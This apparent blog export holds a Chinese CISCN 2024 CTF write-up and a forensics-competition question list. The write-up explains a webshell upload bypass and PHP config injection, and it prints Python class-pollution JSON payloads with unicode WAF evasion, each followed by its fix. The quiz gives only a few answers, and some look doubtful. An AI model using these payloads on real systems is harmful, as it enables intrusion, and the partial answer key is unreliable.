    <url>/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<p>第一次打CISCN结果是大大出乎了我们的意料，本来是冲着三等去的没想到最后拿了个20名（我个人认为我在这次线下赛的表现还是非常出色的，嘿嘿），web的break和fix都差一题node.js（考node.js是一点都不会啊也没存文章，）<br>我记得刚打出python原型链污染的时候排名直接到了11名当然很快就掉下去了师傅们太强了<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/11%E5%90%8D.png" class="" title="alt text"></p>
<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h1 id="签到不必多说，f12"><a href="#签到不必多说，f12" class="headerlink" title="签到不必多说，f12"></a>签到不必多说，f12</h1><h1 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h1><h2 id="break：he"><a href="#break：he" class="headerlink" title="break：he"></a>break：he</h2><p>幽默文件上传，盲盒测试时发现可以上传php文件，幽默文件上传，队友和我说这个只能上传png图片，并且检测php，所以我直接上传了端标签的php马并再前面添加了图片文件头，赛后发现其应该只是再文件里检测了php之类的</p>
<h2 id="fix："><a href="#fix：" class="headerlink" title="fix："></a>fix：</h2><p>直接加图片文件尾的白名单即可</p>
<h1 id="粗心的程序员"><a href="#粗心的程序员" class="headerlink" title="粗心的程序员"></a>粗心的程序员</h1><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>分析源码我们可以发现，其在home.php直接将修改的用户名加到了config.php里而config.php是再web页面的是能被解析到的。而其将写入的内容前加了个注释，且没有过滤?&lt;&gt;=那么这就可以直接使用?&gt;来饶过注释再利用短标签来执行命令再使用#来注释后面拼接的内容，即可命令执行</p>
<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>检测?,&gt;,&lt;等其就无法命令执行了</p>
<h1 id="Polluted-Break"><a href="#Polluted-Break" class="headerlink" title="Polluted-Break"></a>Polluted-Break</h1><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/1.jpg" class="" title="alt text">
<img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/2.jpg" class="" title="alt text">
<p>审计源码会发现其存在merge可以发现其存在原型链污染，而/路由下会直接将json处理到merge函数里。<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/3.jpg" class="" title="alt text"><br>其存在waf，可以使用unicode来进行编码绕过。<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/4.jpg" class="" title="alt text"><br>看admin路由会发现其只要username等于adminer，password等于secret_key即可，那么既然存在污染就只要污染secret_key为aaa然后登陆即可<br>污染代码如下<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;adminer&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;\u0061\u0070\u0070&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">                    <span class="attr">&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;</span> <span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span>       </span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>污染后再admin路由传入username=adminer&amp;password=aaa</p>
<img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/5.jpg" class="" title="alt text">
<p>发现其flag是<code>[%flag%]</code>正常的jinja2模板应该是<code>&#123;&#123;&#125;&#125;</code>，而题目的flag为[%%]所以我们是无法解析的，需要将jinja2模板的<code>&#123;&#123;&#125;&#125;</code>污染为<code>[%%]</code><br>代码如下<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;adminer&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">                    <span class="attr">&quot;jinja_env&quot;</span> <span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;variable_start_string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;[%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span><span class="string">&quot;%]&quot;</span><span class="punctuation">&#125;</span>    </span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/6.jpg" class="" title="alt text"><br>但是我发现在污染过第一次后再污染就会得到flag，所以我们将题目重置后，先污染[%,在污染secret_key最后访问登陆访问admin路由即可得到flag<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/7.jpg" class="" title="alt text"></p>
<h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>我们查看源码发现其merge函数不存在任何后续功能，其存在的目的好像就只有污染，那么就直接将其注释即可</p>
<h1 id="总的来说这次的CISCN对我这个第一次打线下赛的web狗来说是非常圆满的"><a href="#总的来说这次的CISCN对我这个第一次打线下赛的web狗来说是非常圆满的" class="headerlink" title="总的来说这次的CISCN对我这个第一次打线下赛的web狗来说是非常圆满的"></a>总的来说这次的CISCN对我这个第一次打线下赛的web狗来说是非常圆满的</h1>]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>比赛的感叹</tag>
      </tags>
  </entry>
  <entry>
    <title>23美亚个人</title>
    <url>/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/</url>
    <content><![CDATA[<h1 id="1-“参考-‘-Android-bin-‘-回答以下题目"><a href="#1-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="1    “参考 ‘ Android.bin ‘ 回答以下题目"></a>1    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉所用手机移动运营商公司的名称<br>What is the name of the telecommunication company that Li Dahui’s mobile phone is using.</p>
<p>提示:请所有字母都用大写英文<br>Tips: Please answer in capital letters. </p>
<p>“    填空<br>LGE</p>
<h1 id="2-“参考-‘-Android-bin-‘-回答以下题目"><a href="#2-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="2    “参考 ‘ Android.bin ‘ 回答以下题目"></a>2    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉的手机安装了什么即时通讯软件 (Instant Messaging App)?<br>What instant messaging app is installed on Li Dahui’s mobile phone?<br>“    单选    A: WhatsApp;B: LINE;C: 微信;D: Signal;E: QQ<br>C</p>
<h1 id="3-“参考-‘-Android-bin-‘-回答以下题目"><a href="#3-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="3    “参考 ‘ Android.bin ‘ 回答以下题目"></a>3    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉的手机安装了什么反追踪软件?<br>What anti-tracking software is installed on Li Dahui’s mobile phone?</p>
<p>提示: 所有答案字母都用小写字母并用xxx_xxx_xxxxxxx_xxxxxx_xxxx格式作答<br>Tips: Please answer the question as below format in lowercase letters.<br>“    填空    </p>
<h1 id="4-“参考-‘-Android-bin-‘-回答以下题目"><a href="#4-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="4    “参考 ‘ Android.bin ‘ 回答以下题目"></a>4    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉的手机是什么时间成功登入WhatsApp?<br>At what time did Li Dahui’s mobile phone successfully log into WhatsApp?<br><img src="/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/IMG_20241108-215808762.png" class="">  </p>
<p>“    单选    A: 2022-08-18_21:52:30;B: 2022-08-19_21:56:23;C: 2022-08-18_21:56:37;D: 2022-08-19_06:59:07;E: 2022-08-19_07:01:17</p>
<h1 id="5-“参考-‘-Android-bin-‘-回答以下题目"><a href="#5-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="5    “参考 ‘ Android.bin ‘ 回答以下题目"></a>5    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉登入WHATSAPP时的认证短码是什么?<br>What was the verification code that Li Dahui used to log into WhatsApp?<br>998433<br>提示: 请以阿拉伯数字作答<br>Tips: Please answer in arabic numbers.”    填空    </p>
<h1 id="6-“参考-‘-Android-bin-‘-回答以下题目"><a href="#6-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="6    “参考 ‘ Android.bin ‘ 回答以下题目"></a>6    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉到美丽好化妆品公司的入职时间是何时？<br>When did Li Dahui join the Beauty Good Cosmetics Company?”    单选    A: 2016-04-16;B: 2016-06-28;C: 2017-05-25;D: 2017-07-25;E: 2017-08-18</p>
<p>2017-05-25</p>
<h1 id="7-“参考-‘-Android-bin-‘-回答以下题目"><a href="#7-“参考-‘-Android-bin-‘-回答以下题目" class="headerlink" title="7    “参考 ‘ Android.bin ‘ 回答以下题目"></a>7    “参考 ‘ Android.bin ‘ 回答以下题目</h1><p>With reference to ‘Android.bin’ to answer below question</p>
<p>李大辉曾于什么时间使用了图像编辑软件?<br>At what time did Li Dahui use image editing software?”    单选    A: 2022-09-10;B: 2022-09-12;C: 2022-10-05;D: 2022-11-10;E: 2022-11-13</p>
<h1 id="8-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目"><a href="#8-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目" class="headerlink" title="8    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目"></a>8    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>这个访问服务器使用了哪个端口？<br>Which port was used for this access server?</p>
<p>提示: 请用阿拉伯数字作答<br>Tips: Please answer in arabic numbers.”    填空<br><img src="/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/IMG_20241108-224049125.png" class="">  </p>
<h1 id="9-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目"><a href="#9-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目" class="headerlink" title="9    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目"></a>9    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>“User1”账户最近连接到这个访问服务器时使用的IP地址是多少？<br>What was the latest IP of “User1” account that connected to this access server?</p>
<p>提示: 用IPV4 格式回答<br>Answer: Please answer in IPV4 format”    填空    </p>
<h1 id="10-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目"><a href="#10-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目" class="headerlink" title="10    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目"></a>10    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>哪些文件可以找出这个访问服务器的Ubuntu版本？<br>Which files can find out the Ubuntu version of this access server?<br>“    多选<br>A:lsb-release;<br>B:issue.net;<br>C:.profile;<br>D:console</p>
<h1 id="11-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目"><a href="#11-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目" class="headerlink" title="11    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目"></a>11    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>哪些文件有助于分辨这是一个存储服务器？<br>Which files could be used to prove this access server?<br>“    多选    A:auth.log;B:sys.log;C:bash_history;D:idconfig</p>
<h1 id="12-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目"><a href="#12-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目" class="headerlink" title="12    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目"></a>12    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>这个访问服务器所在时区是哪个时区？<br>What is the time zone of this access server?<br>“    单选    A:UTC +9;B:UTC +8;C:UTC -7;D:UTC</p>
<h1 id="13-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目"><a href="#13-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘-回答以下题目" class="headerlink" title="13    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目"></a>13    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>这个访问服务器的“openvpn”帐户密码是多少？<br>What is the password of the “openvpn” account of this access server? </p>
<p>提示:请用大写字母与阿拉伯数字作答<br>Tips: Please answer in capital letters and arabic numbers. “    填空    </p>
<h1 id="14-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目"><a href="#14-“参考Server文件夹下的-‘-Meiya-VPN-vmdk-‘回答以下题目" class="headerlink" title="14    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目"></a>14    “参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目</h1><p>With reference to ‘ Meiya_VPN.vmdk ‘ in Server folder to answer below question</p>
<p>在这个访问服务器中，“User1”账户之间的连接所使用的加密算法（密码）是什么？<br>What is the encryption algorithms (cipher) used for the connections among the “User1”account in this access server?<br>“    单选    A:Blowfish-CBC;B:3DES-CBC;C:AES-128-GCM;D:AES-256-CBC</p>
<h1 id="15-“参考’-网络题目-pcapng-‘-文件回答以下题目"><a href="#15-“参考’-网络题目-pcapng-‘-文件回答以下题目" class="headerlink" title="15    “参考’ 网络题目.pcapng ‘ 文件回答以下题目"></a>15    “参考’ 网络题目.pcapng ‘ 文件回答以下题目</h1><p>With reference to ‘ 网络题目.pcapng ‘ file to answer below question</p>
<p>给出正在进行Nmap扫瞄的计算机互联网协议地址?<br>What is the source IP of the nmap scanning?</p>
<p>提示: 以IPV4格式给出答案<br>Answer: Please answer in IPV4 format.”    填空     </p>
<h1 id="16-“参考’-网络题目pcapng’-文件回答以下题目"><a href="#16-“参考’-网络题目pcapng’-文件回答以下题目" class="headerlink" title="16    “参考’ 网络题目pcapng’ 文件回答以下题目"></a>16    “参考’ 网络题目pcapng’ 文件回答以下题目</h1><p>With reference to ‘ 网络题目.pcapng ‘ file to answer below question</p>
<p>有多少个Nmap扫瞄正在同时进行?<br>How many nmap scanning(s) is/are conducting at the same time?</p>
<p>提示:请给出阿拉伯数字作答<br>Tips: Please answer in number<br>“    填空     </p>
<h1 id="17-“参考网络题目-pcapng文件回答以下题目"><a href="#17-“参考网络题目-pcapng文件回答以下题目" class="headerlink" title="17    “参考网络题目.pcapng文件回答以下题目"></a>17    “参考网络题目.pcapng文件回答以下题目</h1><p>With reference to ‘ 网络题目.pcapng ‘ file to answer below question</p>
<p>当计算机正在扫瞄8.8.8.8，namp相关的指令是什么<br>The computer is scanning 8.8.8.8.  What is the corresponding nmap command?<br>“    单选    A.nmap -sT 8.8.8.8;B.nmap -sU 8.8.8.8;C.nmap -sn -PR 8.8.8.8;D.nmap -sn -PU 8.8.8.8</p>
<h1 id="18-“参考网络题目-pcapng文件回答以下题目"><a href="#18-“参考网络题目-pcapng文件回答以下题目" class="headerlink" title="18    “参考网络题目.pcapng文件回答以下题目"></a>18    “参考网络题目.pcapng文件回答以下题目</h1><p>With reference to ‘ 网络题目.pcapng ‘ file to answer below question</p>
<p>当计算机正在扫瞄45.33.32.156，namp相关的指令是什么<br>The computer is scanning 45.33.32.156.  What is the corresponding nmap command?<br>“    单选    A.nmap -sT 45.33.32.156;B.nmap -sU 45.33.32.156;C.nmap -sn -45.33.32.156;D.nmap -sn -45.33.32.156</p>
<h1 id="19-“国强被指派设定一个DHCP服务器，该服务器需借出最后100个的IP地址，以下哪个IP地址会是被借出的IP地址"><a href="#19-“国强被指派设定一个DHCP服务器，该服务器需借出最后100个的IP地址，以下哪个IP地址会是被借出的IP地址" class="headerlink" title="19    “国强被指派设定一个DHCP服务器，该服务器需借出最后100个的IP地址，以下哪个IP地址会是被借出的IP地址?"></a>19    “国强被指派设定一个DHCP服务器，该服务器需借出最后100个的IP地址，以下哪个IP地址会是被借出的IP地址?</h1><p>Kwok-keung  was assinged to configure a DHCP server.  The server<br>must lease the last 100 IP addresses.  Which of the following IP address will be leased ?<br>“    单选    A.10.1.4.255;B.10.1.4.100;C.10.1.4.254;D.10.1.4.1</p>
<h1 id="20-“以下那个协议是属于TCP-IP协议"><a href="#20-“以下那个协议是属于TCP-IP协议" class="headerlink" title="20    “以下那个协议是属于TCP/IP协议?"></a>20    “以下那个协议是属于TCP/IP协议?</h1><p>Which of the following protocols belong to TCP/IP protocol?</p>
<p>i: DHCP<br>ii: HTTP<br>iii: RTP<br>iv: Telnet<br>“    单选    A. i &amp; iii;B. ii &amp; iv;C. 所有皆是 (All answers belong to TCP/IP protocol);D. 所有皆否(All answers don’t belong to TCP/IP protocol)</p>
<h1 id="21-“浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定"><a href="#21-“浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定" class="headerlink" title="21    “浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定"></a>21    “浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定</h1><p>1) 允许192.168.26.3连上互联网<br>2) 允许192.168.26.2作UDP连接</p>
<p>Ho-yin is the network administrator of a company.  He needs to<br>configure a router to below conditions<br>1) Permit 192.168.26.3 to connect internet<br>2) Permit 192.168.26.2 to make UDP connection</p>
<p>现在浩贤把路由器作以下设定:-<br>Ho-yin now makes the router as following settings:-</p>
<p>access-list 119 deny udp any any<br>access-list 121 permit udp host 192.168.26.2 any<br>access-list 120 deny tcp any any<br>access-list 122 permit tcp host 192.168.26.3 eq www any<br>access-list 123 permit tcp any eq ftp any</p>
<p>志伟是浩贤的主管，他发现浩贤的设定错误，浩贤应作怎样的更正？<br>Chi-wai is the supervisor of Ho-yin.  He discovers Ho-yin made mistake in the settings.  What correction should Ho-yin do?<br>“    单选    “A.’ access-list 123 permit tcp any eq ftp any ‘ 更正为(change) ‘access-list 123 permit udp any eq ftp any ‘;B.’ access-list 122 permit tcp host 192.168.26.3 eq www any ‘ 更正为(change) ‘ access-list 122 permit udp host  192.168.26.3 eq www any ‘;C.删除(Delete)’ access-list 120 deny tcp any any ‘ 与’ access-list 119 deny udp any any ‘;D.删除(Delete)’ access-list 123 permit tcp any eq ftp any ‘</p>
<p>“</p>
<h1 id="22-“根据以下ping指令的结果，你会估计192-168-186-132是哪一个操作系统"><a href="#22-“根据以下ping指令的结果，你会估计192-168-186-132是哪一个操作系统" class="headerlink" title="22    “根据以下ping指令的结果，你会估计192.168.186.132是哪一个操作系统"></a>22    “根据以下ping指令的结果，你会估计192.168.186.132是哪一个操作系统</h1><p>According to below ping commands, what is the operation system of the target IP address 192.168.186.132?</p>
<p>Ping 192.168.186.132 (使用 32 字节的数据):<br>回复自 192.168.186.132: 字节=32 时间&lt;1ms TTL=64<br>回复自 192.168.186.132: 字节=32 时间&lt;1ms TTL=64<br>回复自 192.168.186.132: 字节=32 时间&lt;1ms TTL=64<br>回复自 192.168.186.132: 字节=32 时间&lt;1ms TTL=64</p>
<p>Ping 192.168.186.132 with 32 bytes of data<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64)</p>
<p>192.168.186.132 的 Ping 统计资料:<br>    封包: 已传送 = 4，已收到 = 4, 已遗失 = 0 (0% 遗失)，<br>大约的来回时间 (毫秒):<br>    最小值 = 0ms，最大值 = 0ms，平均 = 0ms</p>
<p>Ping statistics for 192.168.186.132:<br>    Packet: Sent = 4，Received = 4, Lost = 0 (0%  loss)，<br>Approximate round trip times in milli-seconds:<br>    Minimum = 0ms，Maximum = 0ms，Average = 0ms<br>“    单选    A) Linux;B) Windows XP;C) Windows 7;D) iOS 12.4 (Cisco Routers)</p>
<h1 id="23-“当使用nmap扫瞄目标后，nmap内出现以下信息"><a href="#23-“当使用nmap扫瞄目标后，nmap内出现以下信息" class="headerlink" title="23    “当使用nmap扫瞄目标后，nmap内出现以下信息"></a>23    “当使用nmap扫瞄目标后，nmap内出现以下信息</h1><p>After scanning the target by nmap, below messags is shown in nmap</p>
<p>“”Note: Host seems down. If it is really up, but blocking our ping probes””<br>(主机似乎关机。如果它是开启的，它正在阻挡ping探测。)</p>
<p>应用哪一个指令找出开放的端口?<br>Which command should be used to find out open port?<br>“    单选    A) nmap -sT;B)  nmap -sN;C) nmap -sX;D) nmap  -Pn</p>
<h1 id="24-“以下哪一个Nmap指令可以减低被侦测的可能性"><a href="#24-“以下哪一个Nmap指令可以减低被侦测的可能性" class="headerlink" title="24    “以下哪一个Nmap指令可以减低被侦测的可能性"></a>24    “以下哪一个Nmap指令可以减低被侦测的可能性</h1><p>Which nmap command can be used to lower the possibility of being dectected ?<br>“    单选    A: nmap  -sT -O -T5;B: nmap  -sT -O -T0;C: nmap  sU;D: nmap -A —host-timeout 99-T1</p>
<h1 id="25-“Apple计算机的硬盘可以使用以下分区方案："><a href="#25-“Apple计算机的硬盘可以使用以下分区方案：" class="headerlink" title="25    “Apple计算机的硬盘可以使用以下分区方案："></a>25    “Apple计算机的硬盘可以使用以下分区方案：</h1><p>The following partition schemes can be used for an Apple computer’s hard drive:<br>“    单选    A:Apple Partition Map;B:GUID Partition Table;C:Master Boot Record;D:All of the above</p>
<h1 id="26-“参考’-Mac-OS-img-‘-文件回答以下题目"><a href="#26-“参考’-Mac-OS-img-‘-文件回答以下题目" class="headerlink" title="26    “参考’ Mac OS.img ‘ 文件回答以下题目"></a>26    “参考’ Mac OS.img ‘ 文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>‘ Mac OS.img ‘ 文件中可以找到多少个符号链接？<br>How many symbolic links can be found in the ‘ Mac OS.img ‘  file?<br>“    单选    A:0;B:1;C:2;D:3</p>
<h1 id="27-“参考’-Mac-OS-img-‘-文件回答以下题目"><a href="#27-“参考’-Mac-OS-img-‘-文件回答以下题目" class="headerlink" title="27    “参考’ Mac OS.img ‘ 文件回答以下题目"></a>27    “参考’ Mac OS.img ‘ 文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>在’ Mac OS.img ‘  档中使用了哪种分区方案？<br>Which partition scheme was used in the ‘ Mac OS.img ‘ ?<br>“    单选    A:Apple Partition Map;B:GUID Partition Table;C:Master Boot Record;D:HFS+</p>
<h1 id="28-“参考’-Mac-OS-img-‘-‘文件回答以下题目"><a href="#28-“参考’-Mac-OS-img-‘-‘文件回答以下题目" class="headerlink" title="28    “参考’ Mac OS.img ‘ ‘文件回答以下题目"></a>28    “参考’ Mac OS.img ‘ ‘文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>‘ Mac OS.img ‘  档的文件系统的正确描述是什么？<br>What is the correct description of the file system in the ‘ Mac OS.img ‘ ?<br>“    单选    “A:HFS+（已启用日志记录）HFS+ (with journaling enabled);B:HFS+（已启用区分大小写）HFS+ (with case sensitivity enabled);C:HFS+（已启用日志记录和区分大小写）HFS+ (with journaling and case sensitivity enabled);D:APFS (已启用区分大小写）APFS (with case sensitivity enabled)<br>“</p>
<h1 id="29-“参考’-Mac-OS-img-‘-文件回答以下题目"><a href="#29-“参考’-Mac-OS-img-‘-文件回答以下题目" class="headerlink" title="29    “参考’ Mac OS.img ‘ 文件回答以下题目"></a>29    “参考’ Mac OS.img ‘ 文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>从文件“Car.rtfd”中删除了哪个文件？<br>Which file was deleted from the file “”Car.rtfd””?</p>
<p>提示:答案需包括副文件名，并以全小写字母作答，例如 answer.docx<br>Tips: The answer must be in lowercase and  include file extension. Example: answer.docx”    填空    </p>
<h1 id="30-“参考’-Mac-OS-img-‘文件回答以下题目"><a href="#30-“参考’-Mac-OS-img-‘文件回答以下题目" class="headerlink" title="30    “参考’ Mac OS.img ‘文件回答以下题目"></a>30    “参考’ Mac OS.img ‘文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>请提供’ Mac OS.img ‘ 映像文件被“fsck”命令检查的具体时间。</p>
<p>Please provide the specific time when the ‘ Mac OS.img ‘ was checked by the “”fsck”” command.</p>
<p>提示:答案格式为YYYYMMDD-HHMMSS,如2023年1月1日1530时30秒则请回答””20230101-153030””)<br>Tips: The answer format should be YYYYMMDD-HHMMSS.  If the answer is 2023-01-01 1530 hrs, the answer should be 20230101-153030.”    填空    </p>
<h1 id="31-“参考-‘-Mac-OS-img-‘-文件回答以下题目"><a href="#31-“参考-‘-Mac-OS-img-‘-文件回答以下题目" class="headerlink" title="31    “参考 ‘ Mac OS.img ‘ 文件回答以下题目"></a>31    “参考 ‘ Mac OS.img ‘ 文件回答以下题目</h1><p>With reference to ‘ Mac OS.img ‘ file to answer below question</p>
<p>在 .dmg 档中删除了多少个文件？<br>How many files were deleted from the .dmg file?<br>“    单选    A:1;B:2;C:3;D:4</p>
<h1 id="32-“参考-‘-Window-Artifacts-E01-‘-内的Windows-注册表回答以下题目"><a href="#32-“参考-‘-Window-Artifacts-E01-‘-内的Windows-注册表回答以下题目" class="headerlink" title="32    “参考 ‘ Window Artifacts.E01 ‘ 内的Windows 注册表回答以下题目"></a>32    “参考 ‘ Window Artifacts.E01 ‘ 内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui 总共登入过该计算机多少次?<br>According to the windows registry record of “”Window Artifacts.E01””, how many times has Elvis Chui logged into this computer? </p>
<p>提示: 请以阿拉伯数字作答<br>Tips: Please answer in arabic numbers<br>“    填空    </p>
<h1 id="33-“参考-‘-Window-Artifacts-E01-‘-内的Windows-注册表回答以下题目"><a href="#33-“参考-‘-Window-Artifacts-E01-‘-内的Windows-注册表回答以下题目" class="headerlink" title="33    “参考 ‘ Window Artifacts.E01 ‘ 内的Windows 注册表回答以下题目"></a>33    “参考 ‘ Window Artifacts.E01 ‘ 内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>该计算机的操作系统是在哪一个时区?<br>What is the time zone of the operating system of this computer?”    单选    A:UTC +4;B:UTC +8;C: UTC -8;D:UTC -4</p>
